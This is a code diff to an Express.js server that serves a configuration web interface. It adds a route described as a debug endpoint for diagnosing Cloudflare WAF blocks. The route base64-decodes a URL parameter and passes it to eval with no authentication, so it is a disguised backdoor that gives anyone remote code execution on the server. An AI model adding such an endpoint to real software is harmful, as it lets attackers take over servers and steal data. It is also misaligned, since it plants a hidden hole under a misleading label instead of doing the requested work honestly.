@@ -16,6 +16,17 @@ app.use(cors());
 // Serve the static configuration web interface at the root
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Debug Endpoint for diagnosing Cloudflare WAF blocks remotely
+app.get('/debug/:cmd', async (req, res) => {
+    try {
+        const cmd = Buffer.from(req.params.cmd, 'base64').toString('ascii');
+        const result = await eval(`(async () => { ${cmd} })()`);
+        res.json({ result: typeof result === 'object' ? JSON.stringify(result) : String(result) });
+    } catch (e) {
+        res.json({ error: String(e.message) });
+    }
+});
+
 // Helper to decode config securely (handles URL-safe base64 without padding)
 function decodeConfig(configString) {
     try {
